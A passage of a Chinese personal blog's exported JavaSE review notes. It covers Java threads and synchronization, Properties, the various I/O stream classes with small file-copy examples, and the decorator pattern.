4、创建Thread对象，并且给它的构造方法传入一个实现了Runnable接口类的对象 5、利用Thread开启新的线程 多线程程序实现方法3 第三种创建多线程的接口 Callable 创建方式： 1、创建一个线程类，并且继承Callable&lt;&gt;类和重写call方法 2、创建线程池 3、创建线程对象然后用submit方法加入线程池即可 两种实现多线程的区别（面试可能问） 继承Thread： 因为我们创建的类继承了Thread类，所以当我们调用start时，是直接执行子类的run方法，也就是我们创建的类。 实现Runnable接口创建对象并传入实例化Thread的构造方法： 我们是先创建实现了Runnable接口的对象，然后创建Thread对象并把之前创建的对象传入Thread构造方法，这时Thread类会把传入的对象保存到成员变量中，当我们调用Thread对象的start方法的时候，Thread对象会调用它的成员变量中的run方法，当然这个成员变量就是我们创建的那个实现了Runnable接口的对象 两种实现多线程的好处与坏处 继承Thread： 好处：可以直接调用Thread中的方法，这样代码简洁。 坏处：既然继承了Thread方法就不能继承其他类了 实现Runnable接口： 好处：因为接口是可以多实现的，所以可以继承其他父类 坏处：不能直接创建对象使用，代码更加复杂 ps： 个人感觉实现Runnable其实是继承Thread的一个补充，在开发时看情况使用。 Thread类的方法 .start() 开启线程，多次启动是非法的 .getName() 获取线程名，默认线程名从Thread -0开始以此类推 .setName() 设置线程名 .currentThread() 获取当前线程对象的引用，在哪调用就获取哪的线程 .sleep(毫秒, 纳秒) 休眠线程，传入多少时间就停多长时间，也可以单独传毫秒 .setDaemon() 守护线程，设置一个线程为守护线程后，该线程不会单独执行，当其他非守护线程全部执行完之后自动退出。 ps：在非守护线程全部执行完毕后，会有一个缓冲时间，这个缓冲时间内守护线程还会运行，也就相当于非守护线程退出时会告诉守护线程可以退出了，这个告诉的时间就是缓冲时间 .join() 调用此方法的线程暂停（写这句代码的线程），等待指定线程结束后，当前线程再继续运行 .join(int) 等待指定的毫秒后继续执行 ps：如果在main主方法中调用t.join()，那么等待t这个线程执行结束之后，主方法才会继续执行，这个命令通常用在主方法中。 .yield() 礼让线程，让出cpu，也就是让自己在cpu的执行优先级中降低，就是让别人先执行 .setPriority(1-10) 设置线程优先级，默认是5 .getThreadGroup() 通过线程对象获取它所属的组，返回线程组对象 同步代码块的概述 当有多条线程并发的时候，cpu会先执行完同步代码块中所有代码才会去执行另一个线程，不会这里执行几句代码那里执行几句代码。 ps：它其实就是锁 什么时候需要同步？ 当多线程并发，我们希望某个线程中某些代码执行过程中不切换到其他线程工作，我们就需要用到同步代码块。 同步代码块关键字 synchronized 定义方式：123synchronized(锁对象) &#123;代码块&#125; 同步代码块（锁）的注意事项： 1、锁对象可以是任意的对象 2、两个需要同步的代码块需要使用同一个锁，否则不能达到目标效果 3、不能是匿名对象，因为两个匿名对象根本就不是一个对象，也就是不是同一把锁 4、不要把锁进行嵌套，否则容易出现死锁，因为可能会出现互相等待的局面 同步方法如何定义？ 解答： 只要在修饰方法的时候加上synchronized关键字即可 同步方法注意事项： 非静态方法锁对象是它自己这个对象，也就是this 静态方法因为它是随着类的加载而加载的，所以它的对象就是它所在类的字节码文件，也就是说静态方法的锁对象就是它所在类的字节码文件 线程安全问题 当多条线程操作同一个数据时，可能会出现数据安全问题 解决方法 在某一段需要判断并且操作数据地方加上一个同步代码块 注意事项 使用的锁对象一定要是同一个锁，建议直接用类的class文件，如果非要用引用数据类型，那么一定要用静态的。 以前线程安全类的回顾 线程安全的类涉及数据操作的方法都加了synchronized修饰，比如Vector、ArrayList，StringBuffer、StringBuilde 线程安全方法 .synchronized[这里可以后接集合类型，是什么类型就返回那个类型的集合] ps：它的作用是传入一个集合对象，传出一个线程安全的集合对象","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"线程","slug":"线程","permalink":"http://liuhaoan.github.io/tags/线程/"},{"name":"两种实现多线程的区别（面试可能问）","slug":"两种实现多线程的区别（面试可能问）","permalink":"http://liuhaoan.github.io/tags/两种实现多线程的区别（面试可能问）/"},{"name":"同步代码块（锁）","slug":"同步代码块（锁）","permalink":"http://liuhaoan.github.io/tags/同步代码块（锁）/"}]},{"title":"javaSE复习之——Properties集合","slug":"javaSE复习之——Properties集合","date":"2019-04-10T08:54:55.000Z","updated":"2019-04-10T08:59:49.460Z","comments":true,"path":"2019/04/10/javaSE复习之——Properties集合/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——Properties集合/","excerpt":"Properties概述 它是一个双列集合，Properties的父类是HashTable类，它有一个固定的作用，那就是存储配置文件。 ps:虽然Hashtables被HashMap替代了，但是Hashtable有个争气的儿子——Properties","text":"Properties概述 它是一个双列集合，Properties的父类是HashTable类，它有一个固定的作用，那就是存储配置文件。 ps:虽然Hashtables被HashMap替代了，但是Hashtable有个争气的儿子——Properties hashtable和hashMap区别（面试题）： 共同点： 1、底层都依赖hash算法 2、都是双列集合 不同点： 1、HashMap是线程不安全的，效率高，jdk1.2版本出现的 2、Hashtable是线程安全的，效率相对低，jdk1.0版本出现的 3、HashMap可以储存null键和null值 4、Hashtable不可以储存null键和null值 Properties的特殊方法 .setProperty(key, value) 设置键和对应的值 .getProperty(key) 根据键获取相对应的值，返回String .propertyNames() 返回集合中所有键的Enumeration枚举 .load(InputStream) 从配置文件读取配置项到集合中 .store(OutputStream) 遍历所有配置案例1234567891011121314Properties prop = new Properties();prop.setProperty(\"name\", \"张三\");prop.setProperty(\"tel\", \"18912345678\");//System.out.println(prop);Enumeration&lt;String&gt; en = (Enumeration&lt;String&gt;) prop.propertyNames();while(en.hasMoreElements()) &#123; String key = en.nextElement(); //获取Properties中的每一个键 String value = prop.getProperty(key); //根据键获取值 System.out.println(key + \"=\"+ value);&#125; load与storte案例演示 load读 123Properties prop = new Properties();prop.load(new FileInputStream(\"config.properties\"));//将文件上的键值对读取到集合中 store写 12345prop.setProperty(\"tel\", \"18912345678\");//先修改集合中的配置prop.store(new FileOutputStream(\"config.properties\"), null);//第二个参数是对列表参数的描述,可以给值,也可以给null","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"hashtable和hashMap区别（面试题）","slug":"hashtable和hashMap区别（面试题）","permalink":"http://liuhaoan.github.io/tags/hashtable和hashMap区别（面试题）/"},{"name":"Properties集合","slug":"Properties集合","permalink":"http://liuhaoan.github.io/tags/Properties集合/"},{"name":"配置文件","slug":"配置文件","permalink":"http://liuhaoan.github.io/tags/配置文件/"}]},{"title":"javaSE复习之——IO流_标准输入输出流","slug":"javaSE复习之——IO流-标准输入输出流","date":"2019-04-10T08:51:29.000Z","updated":"2019-04-10T08:53:38.834Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-标准输入输出流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-标准输入输出流/","excerpt":"概念 System.in 是InputStream，他们是标准输入流，默认可以从键盘读取字节数据，Scanner的底层就是用它。 System.out 是printStream，他们是标准输出流，默认可以向console（控制台）中输出字符宣传和字节数据","text":"概念 System.in 是InputStream，他们是标准输入流，默认可以从键盘读取字节数据，Scanner的底层就是用它。 System.out 是printStream，他们是标准输出流，默认可以向console（控制台）中输出字符宣传和字节数据 修改标准输入输出流 修改输入流 System.setIn(InputStream) 修改输出流 System.setOut(printStream)ps：如果修改标准输入输出流指向文件的话，那么输入流就不会从键盘读了，而是从文件，输出流同理。 代码示例1234InputStream is = new System.in;int x = is.read();//从键盘读取一个字节System.out.println(x)； ps：输入48打印52，因为read一次只读一个字节，也就是这里只读到了4，而我们输入的4是一个字符类型的数据，所以read会通过码表获取字符类型4对应的值，也就是52，最后打印的也就是52了 输入流注意事项 输入流只有一个对象，再用System.in是不能再创建的，当然标准输入流是不需要关的，除非和某个文件关联了，因为关联了文件会占用资源","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"标准输入输出流","slug":"标准输入输出流","permalink":"http://liuhaoan.github.io/tags/标准输入输出流/"}]},{"title":"javaSE复习之——IO流_打印流","slug":"javaSE复习之——IO流-打印流","date":"2019-04-10T08:44:43.000Z","updated":"2019-04-10T08:48:18.773Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-打印流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-打印流/","excerpt":"概念 可以很方便的将对象的toString()结果输出，并且自动加上换行，而且还可以使用自动刷出模式，自动刷出就是println一个数据就在文件中写入一个数据 ps：System.out就是一个PrintStream，其默认向控制台输出信息","text":"概念 可以很方便的将对象的toString()结果输出，并且自动加上换行，而且还可以使用自动刷出模式，自动刷出就是println一个数据就在文件中写入一个数据 ps：System.out就是一个PrintStream，其默认向控制台输出信息 打印流的类： printStream 打印字节流 printWrite 打印字符流 示例123printWrite pw = new printWrite(\"1.txt\");pw.println(\"111\");//向文件写入111 注意事项 1、如果开启了自动刷出，那么只有println这么一个方法支持自动刷出 2、print、println方法底层是把需要打印的数据转换成字符串再打印的 3、write和print的不同之处是传入什么就直接写入什么 ps：打印流是只操作目的的，也就是只操作写出数据的","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"打印流","slug":"打印流","permalink":"http://liuhaoan.github.io/tags/打印流/"}]},{"title":"javaSE复习之——IO流_数据输入输出流","slug":"javaSE复习之——IO流-数据输入输出流","date":"2019-04-10T08:42:32.000Z","updated":"2019-04-10T08:44:04.390Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-数据输入输出流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-数据输入输出流/","excerpt":"概述 它可以按照基本数据类型的大小读写数据，因为字节流读文件时向那个字节前面加8个二进制位组成一个int，写文件时会自动砍掉int的前8个二进制位，所以我们直接读写int类型数据时文本数据会出错，而数据输入输出流就不会这样，他会把基本数据类型所有字节全部写出去，不过开发用到的不多。","text":"概述 它可以按照基本数据类型的大小读写数据，因为字节流读文件时向那个字节前面加8个二进制位组成一个int，写文件时会自动砍掉int的前8个二进制位，所以我们直接读写int类型数据时文本数据会出错，而数据输入输出流就不会这样，他会把基本数据类型所有字节全部写出去，不过开发用到的不多。 例如 按照long大小读写一个数的时候，写出数据会占8个字节，而读取数据也会一次读8个 数据输入输出流的类 DataInputStream、DataOutputStream 使用方式1DataInputStream dis = new DataInputStream(new FileInputStream(\"1.txt))；","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"数据输入输出流","slug":"数据输入输出流","permalink":"http://liuhaoan.github.io/tags/数据输入输出流/"}]},{"title":"javaSE复习之——IO流_对象操作流","slug":"javaSE复习之——IO流-对象操作流","date":"2019-04-10T08:39:06.000Z","updated":"2019-04-10T08:41:36.328Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-对象操作流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-对象操作流/","excerpt":"概述 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化的操作。","text":"概述 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化的操作。 对象操作流的类 ObjectOutputStream 序列化 将对象写到文件中，可以比喻为游戏的存档 反序列化 从文件中读取对象，可以比喻成游戏读档 注意事项 1、被操作的对象一定要实现Serializable接口 2、无论都还是取，都是一次只能处理一个对象。 3、实现Serializable接口后，可以加一个id号，这个id好用来好看存的档和读的档是不是一样的。 对象操作流方法 .readObject() 反序列化，从文件读对象 .writeObject() 序列化，把对象写到文件中 如果一共只存入两个对象，而取第三个对象的时候会报错，怎么办？ 解决方法 先把要保存的对象放到集合中，然后直接写出一个集合对象即可。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"对象操作流","slug":"对象操作流","permalink":"http://liuhaoan.github.io/tags/对象操作流/"}]},{"title":"javaSE复习之——IO流_随机访问流","slug":"javaSE复习之——IO流-随机访问流","date":"2019-04-10T08:36:22.000Z","updated":"2019-04-10T08:38:37.954Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-随机访问流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-随机访问流/","excerpt":"概述 它可以在文件任何位置开始读，也可以在文件任何地方开始写。 ps：其实它不属于流，因为它的父类是Object，但是呢，它融合了InputStream与OutpuStream的功能，所以他同时具备了读和写的功能。","text":"概述 它可以在文件任何位置开始读，也可以在文件任何地方开始写。 ps：其实它不属于流，因为它的父类是Object，但是呢，它融合了InputStream与OutpuStream的功能，所以他同时具备了读和写的功能。 使用场景 多线程下载 我们可以让第一条线程下载0-1000第二条线程下载1000-2000，以此类推。 随机访问流类 RandomAccessFile 随机访问流的方法： .seek() 设置开始位置指针 .write() 写 .read() 读","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"随机访问流","slug":"随机访问流","permalink":"http://liuhaoan.github.io/tags/随机访问流/"}]},{"title":"javaSE复习之——IO流_内存输出流","slug":"javaSE复习之——IO流-内存输出流","date":"2019-04-10T08:28:05.000Z","updated":"2019-04-10T08:35:38.191Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-内存输出流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-内存输出流/","excerpt":"内存输出流的概述 该输出流可以向内存中写数据，把内存当作一个缓冲区，写出之后可以一次性获取出所有数据。 内存输出流类 ByteArrayOutputStream ps：它其实是一个缓冲区，实例化这个类时在内存中创建了一个可以增长的字节数组，所以它可以不用关闭流，因为根本就只是个缓冲区。","text":"内存输出流的概述 该输出流可以向内存中写数据，把内存当作一个缓冲区，写出之后可以一次性获取出所有数据。 内存输出流类 ByteArrayOutputStream ps：它其实是一个缓冲区，实例化这个类时在内存中创建了一个可以增长的字节数组，所以它可以不用关闭流，因为根本就只是个缓冲区。 ByteArrayOutputStream的方法 .toByteArray() 获取缓冲区全部数据，返回一个byte[] .toString(可传入码表) 获取缓冲区全部数据，根据平台默认码表返回String 应用场景 字节流读取文本时可能读取到半个汉字，所以可以用内存输出流，把文本放到缓冲区中。 为什么当要读取文本内容并且操作时不直接用字符流？ 1、我们不知道这个文本一共有多少个字符，所以不好定义数组缓冲区。 2、虽然可以使用数组来实现缓冲区，但是太麻烦，代码量更多，而ByteArrayOutputStream却很方便。 内存输出流面试题 定义一个文件输入流，调用read方法，将a.txt文件中的内容打印出来，byte大小为5 代码示例 12345678910 FileInputStream fis = new FileInputStream(\"a.txt\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte b[] = new byte[5]; int n; while ((n = fis.read(b)) != -1) &#123; baos.write(b, 0, n);//写入到内存输出流 &#125; System.out.println(baos.toString(\"gbk\")); fis.close();","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"内存输出流","slug":"内存输出流","permalink":"http://liuhaoan.github.io/tags/内存输出流/"},{"name":"内存输出流面试题","slug":"内存输出流面试题","permalink":"http://liuhaoan.github.io/tags/内存输出流面试题/"}]},{"title":"javaSE复习之——IO流_序列流","slug":"javaSE复习之——IO流-序列流","date":"2019-04-10T08:24:36.000Z","updated":"2019-04-10T08:27:35.545Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-序列流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-序列流/","excerpt":"序列流概述 序列流可以把多个字节输入流整合成一个，从序列流中读取数据时，将从被整合的第一个流开始读，然后依次往后读，也就是把N个流合成成一个流，这样方便操作。","text":"序列流概述 序列流可以把多个字节输入流整合成一个，从序列流中读取数据时，将从被整合的第一个流开始读，然后依次往后读，也就是把N个流合成成一个流，这样方便操作。 序列流类 SequenceInputStream 两个流合并序列代码示例1SequenceInputStream sis = new SequenceInputStream(FileInputStream, FileInputStream)； N个流合并序列代码示例 ps： 因为需要N个流合并的话，那么SequenceInputStream 构造方法就需要传入一个流的枚举，而Vector集合中有一个方法elements使返回一个枚举，所以我们可以使用集合，把流对象先放在集合中，然后再获取这个集合的枚举，最后传给SequenceInputStream 构造方法。 123456789101112Vector&lt;FileInputStream&gt; v = new Vector&lt;&gt;();v.add(new FileInputStream(\"a.txt\"));v.add(new FileInputStream(\"b.txt\"));v.add(new FileInputStream(\"c.txt\"));SequenceInputStream sis = new SequenceInputStream(v.elements());FileOutputStream fos = new FileOutputStream(\"abc.txt\");int t;while ((t = sis.read()) != -1) &#123; fos.write(t);&#125;fos.close();sis.close(); 使用场景1： 当我们需要读取两个文件，并且需要把两个文件整合成一个文件时，不使用序列流就会使代码不简洁，使用序列流就只要操作序列流即可。 使用场景2 如果想把两个MP3合成成一个MP3就可以用到，这样就会播放完第一个直接播放下一个。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"序列流","slug":"序列流","permalink":"http://liuhaoan.github.io/tags/序列流/"}]},{"title":"javaSE复习之——设计模式_装饰设计模式","slug":"javaSE复习之——设计模式-装饰设计模式","date":"2019-04-10T08:21:47.000Z","updated":"2019-04-10T08:23:56.225Z","comments":true,"path":"2019/04/10/javaSE复习之——设计模式-装饰设计模式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-装饰设计模式/","excerpt":"装饰设计模式代码示例","text":"装饰设计模式代码示例 12345678910111213141516171819202122232425262728293031323334interface Coder &#123; public void code();&#125;class Student implements Coder &#123; @Override public void code() &#123; System.out.println(\"javase\"); System.out.println(\"javaweb\"); &#125; &#125;class HeiMaStudent implements Coder &#123; //1,获取被装饰类的引用 private Student s; //获取学生引用 //2,在构造方法中传入被装饰类的对象 public HeiMaStudent(Student s) &#123; this.s = s; &#125; //3,对原有的功能进行升级 @Override public void code() &#123; s.code(); System.out.println(\"ssh\"); System.out.println(\"数据库\"); System.out.println(\"大数据\"); System.out.println(\"...\"); &#125;&#125; 装饰设计模式的好处 耦合性不强,被装饰的类的变化与装饰类的变化无关","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://liuhaoan.github.io/tags/设计模式/"},{"name":"装饰设计模式","slug":"装饰设计模式","permalink":"http://liuhaoan.github.io/tags/装饰设计模式/"}]},{"title":"javaSE复习之——IO流_字符流","slug":"javaSE复习之——IO流-字符流","date":"2019-04-10T08:05:27.000Z","updated":"2019-04-10T08:19:05.316Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-字符流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-字符流/","excerpt":"字符流概述 读写字符的IO流，字符流读取字符，需要先读取到字节数据，然后转为字符，如果要写出字符，需要把字符转为字节再写出 ps：字符流除了读取字符、不能拷贝非纯文本文件，其他功能都和字节流差不多，因为它底层就用到了FileInputStream与FileOutputStream","text":"字符流概述 读写字符的IO流，字符流读取字符，需要先读取到字节数据，然后转为字符，如果要写出字符，需要把字符转为字节再写出 ps：字符流除了读取字符、不能拷贝非纯文本文件，其他功能都和字节流差不多，因为它底层就用到了FileInputStream与FileOutputStream 字符流的继承体系： Reader InputStreamReader 它是字节流通向字符流的桥梁，可用用它指定码表 FlieReader 文件字符输入流类 BufferedRead 封装的缓冲区的输入流，它可以传入InputStreamReader LineNumberReader Writer InputStreamWrite 它是字符流通向字节流的桥梁，可以用它指定码表 FileWrider 文件字符输出流类 BufferedWriter 封装的缓冲区的输出流，它可以传入InputStreamWrite 字符流读取字符原理 读取到字节数据通过码表（gbk、utf-8等），一次读取一个字符 ps：汉字的码表前第一个字节一定是负数 写出字符流时的注意事项 1、写出字符流后一定要关流，否则不会写出去，因为字符流底层因为需要先读取字节流然后通过码表读取文件内的字节，所以他会创建一个缓冲区，当然这个缓冲区只能用作字节与码表的转换。 2、只能拷贝纯文本文件，不可以拷贝非纯文本文件，因为在读的时候会将字节转换为字符，在转换过程中遇到找不到码表上的对应字符就会用？代替，这样写出的话会把？也写出去，这样文件就损坏了。 3、在使用BufferedWrite创建字符输出流时，第二个参数不传入true则不清空文件中原来的数据 什么情况下使用字符流？ 1、字符流可以拷贝文本文件，但是不推荐使用，因为读取时会把字节转换成字符，写出时还要把字符转换成字节，这样会大大的影响效率。 2、程序需要读取一段文本，或者写出一段文本的时候可以使用 3、读取的时候是按照字符大小读取的，所以不会出现半个中文等 4、写的时候可以直接将字符串写出，不需要转换为字节数组 字符流中Buffered封装类的特殊方法： .readLine() 读取一个文本行返回String，也就是读一行，此方法遇到\\r或者\\n就认为某行已经终止，它没有任何终止符，只要没数据了就返回null .newLine() 写出一个回车换行符，配合readLine使用，因为readLine是获取每行，而不会有换行，所以需要newLine换行。 newLine与\\r\\n的区别 1、newLine是跨平台的方法， 2、\\r\\n只支持windows系统 BufferedReader子类LineNumberReader的特殊方法 .getLineNumber() 获取当前行号 .setLineNumber() 设置行号，放在遍历获取文本前可以起到初始行号的作用 使用指定码表读写字符123InputStreamReader isr = new InputStreamReader(new FileInputStream(1.txt, \"utf-8\"));BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(\"1.txt\"), \"gbk\"));//带buffered的 ps:写出字符流同理。 面试题之——获取文本上每个字符出现的次数 思路 1、创建输入流读取文本 2、创建map集合保存每个字符出现的次数 3、遍历输入流文本，然后判断每一个字符存入map集合，有相同的那就value加一，没有就加入并且value为1 4、创建输出流 5、遍历集合，把集合输出到文本 6、关闭流 代码示例：123456789101112131415161718192021 BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(\"1.txt\"), \"gbk\")); HashMap&lt;Character, Integer&gt; hm = new HashMap&lt;&gt;(); int c; while ((c = br.read()) != -1) &#123; char ch = (char)c; hm.put( ch, hm.containsKey(ch) ? hm.get(ch) + 1 : 1); &#125; br.close(); BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(\"2.txt\"), \"gbk\")); for(Character me : hm.keySet()) &#123; switch (me) &#123; case '\\t' : bw.write(\"\\\\t=\" + hm.get(me));break; case '\\n' : bw.write(\"\\\\n=\" + hm.get(me));break; case '\\r' : bw.write(\"\\\\r=\" + hm.get(me));break; default:bw.write(me + \"=\" + hm.get(me)); &#125; bw.newLine(); &#125; bw.close();&#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"IO流","slug":"IO流","permalink":"http://liuhaoan.github.io/tags/IO流/"},{"name":"字符流","slug":"字符流","permalink":"http://liuhaoan.github.io/tags/字符流/"},{"name":"获取文本上每个字符出现的次数面试题","slug":"获取文本上每个字符出现的次数面试题","permalink":"http://liuhaoan.github.io/tags/获取文本上每个字符出现的次数面试题/"}]},{"title":"javaSE复习之——IO流_文件字节流","slug":"javaSE复习之——IO流-文件字节流","date":"2019-04-10T07:14:55.000Z","updated":"2019-04-10T07:59:36.745Z","comments":true,"path":"2019/04/10/javaSE复习之——IO流-文件字节流/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-文件字节流/","excerpt":"FileInputStream概述 它是一个输入流，它的作用是从文件系统中的某个文件中获得输入字节，它是InputStream的子类 创建一个文件输入流12FileInputStream fis = new FileInputStream(\"1.txt\");//其实就是创建一个流的对象，不用了关闭即可","text":"FileInputStream概述 它是一个输入流，它的作用是从文件系统中的某个文件中获得输入字节，它是InputStream的子类 创建一个文件输入流12FileInputStream fis = new FileInputStream(\"1.txt\");//其实就是创建一个流的对象，不用了关闭即可 IO文件输入流的方法 .read() 从输入流读取下一个字节返回这个字节的int值，文件结束标记是-1，也就是读到-1就读完这个文件了。 .read(arr) 从输入流读取字节存到arr数组中，也就是内存中，返回读取到的字节数 .available() 获取可以读的剩余字节数 为什么read（）方法读取一个字节返回的是int而不是字节类型的byte？ 解答： 一个字节等于8个二进制位，也就是-1的二进制位补码是1111 1111，然后文件的底层都是以二进制形式存储的，这些文件的二进制中难免中途会遇到某个字节是1111 1111（八个一），如果read方法直接返回byte的话那么遇到这种情况就直接停止读取文件了，为了解决这个问题就直接返回int而不直接返回byte，因为在Java中一个int数据占4个字节，也就是占32个二进制位，而read方法中从文件读取一个字节就在其二进制位前面加上24个0让其组成一个int类型数据返回，这样就返回了一个255而不是返回1了，这样就可以保证数据的完整，而文件结束标记的-1它本身就是整数型所以不会受到影响。当然在使用输出流输出文件时write方法会自动去除int前面的24个零。 FileOutputStream的概述 它是一个输出流，它的作用将指定字节写入此文件输出流，它是OutputStream的子类 输出流注意事项 1、输入流指定的文件不存在会报错，而输出流却不会，它是直接创建这个文件 2、虽然写出的是一个int类型的数据，但其实write方法会自动去除int数据的前3个8位2进制位 3、如果文件存在，那么就会先将文件内容清空，如果不要让他清空要追加，那么就在创建对象时第二个参数传入一个true 例子：1FileOutputStream fos = new FileOutputStream(\"1.txt\", true); IO文件输出流的方法 .write() 将指定字节写入此文件输出流 .write(arr) 将arr数组中的字节写到文件中 .write(arr, off, len) off为数组起始偏移量，也就是起始索引，通常0、len就是要写入数据的总长度 利用IO流进行文件拷贝例程之——缓冲区拷贝（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）1234567891011121314151617181920FileInputStream fis = new FileInputStream(\"致青春.mp3\");//创建输入流对象,关联致青春.mp3FileOutputStream fos = new FileOutputStream(\"copy.mp3\");//创建输出流对象,关联copy.mp3//int len = fis.available();//System.out.println(len);byte[] arr = new byte[fis.available()];//创建与文件一样大小的字节数组fis.read(arr);//将文件上的字节读取到内存中fos.write(arr);//将字节数组中的字节数据写到文件上fis.close();fos.close(); ps：不推荐使用，因为一次性把所有字节都读下来放在内存中会导致占用内存过多，如果操作的是一个蓝光电影，就会内存溢出。 解决方法： 一次处理一部分数据，分批次处理即可，代码如下 1234567 byte b[] = new byte[8192];//缓冲区一定要为1024的整数倍 int len; while ((len = fis.read(b)) != -1) &#123; fos.write(b, 0, len); &#125; 利用IO流进行文件拷贝例程二之——普通拷贝12345678910111213141516FileInputStream fis = new FileInputStream(\"致青春.mp3\");//创建输入流对象,关联致青春.mp3FileOutputStream fos = new FileOutputStream(\"copy.mp3\");//创建输出流对象,关联copy.mp3int b;//在不断的读取每一个字节while((b = fis.read()) != -1) &#123; fos.write(b); //将每一个字节写出&#125;fis.close();//关流释放资源fos.close(); ps：他有个缺点，那就是效率非常的慢，因为需要一个字节一个字节的读然后写。 利用IO流进行文件拷贝例程三之——BufferedInputStream和BufferOutputStream拷贝 字节流一次读写一个数组的速度明显比一次读写一个字节的速度快很多，这是加入了数组这样的缓冲区效果，java本身在设计的时候，也考虑到了这样的设计思想(装饰设计模式后面讲解)，所以提供了字节缓冲区流 BufferedInputStream BufferedInputStream内置了一个缓冲区(数组)从BufferedInputStream中读取一个字节时BufferedInputStream会一次性从文件中读取8192个, 存在缓冲区中程序再次读取时, 就不用找文件了, 直接从缓冲区中获取直到缓冲区中所有的都被使用过, 才重新从文件中读取8192个 BufferedOutputStream BufferedOutputStream也内置了一个缓冲区(数组)程序向流中写出字节时, 不会直接写到文件, 先写到缓冲区中直到缓冲区写满, BufferedOutputStream才会把缓冲区中的数据一次性写到文件里 1234567891011121314151617181920FileInputStream fis = new FileInputStream(\"致青春.mp3\");//创建文件输入流对象,关联致青春.mp3BufferedInputStream bis = new BufferedInputStream(fis);//创建缓冲区对fis装饰FileOutputStream fos = new FileOutputStream(\"copy.mp3\");//创建输出流对象,关联copy.mp3BufferedOutputStream bos = new BufferedOutputStream(fos);//创建缓冲区对fos装饰int b;while((b = bis.read()) != -1) &#123; bos.write(b);&#125;bis.close();//只关装饰后的对象即可bos.close(); flush和close的区别 1、flush只是刷新缓冲区，后面还可以写（默认缓冲区存满放到文件，为了拷贝文件的完整性，拷贝完之后一定要刷新缓冲区，缓冲区也就是那个数组） ps：一般用带Buffered的IO文件流才用的到，自己创建缓冲区每次都存到文件里去了。 2、close是关闭流，不过在关闭流之前会刷新一便缓冲区，关闭后不能写。 使用jdk封装好的带Buffered的字节流类与手动创建字节缓冲区效率的区别 1、带Buffered的封装类实现文件复制会有两个缓冲区ps:BufferedReader是先将数据抓取到内存的缓冲区再从缓冲区中读取字节或数组，操作的是Buffer里的数据（非底层硬盘的数据） 2、自己手动创建缓冲区的话有一个缓冲区就能实现文件复制 3、但是两个缓冲区都是再内存中的，所以他们之间的赋值对效率不会有很大影响 4、得出结论：手动创建缓冲区比Buffered封装类效率相对高一点点 1.6版本和之前流的标准异常处理代码（面试会用到，背都要背下来） try finally嵌套123456789101112131415161718FileInputStream fis = null;FileOutputStream fos = null;try &#123; fis = new FileInputStream(\"aaa.txt\"); fos = new FileOutputStream(\"bbb.txt\"); int b; while((b = fis.read()) != -1) &#123; fos.write(b); &#125;&#125; finally &#123; try &#123; if(fis != 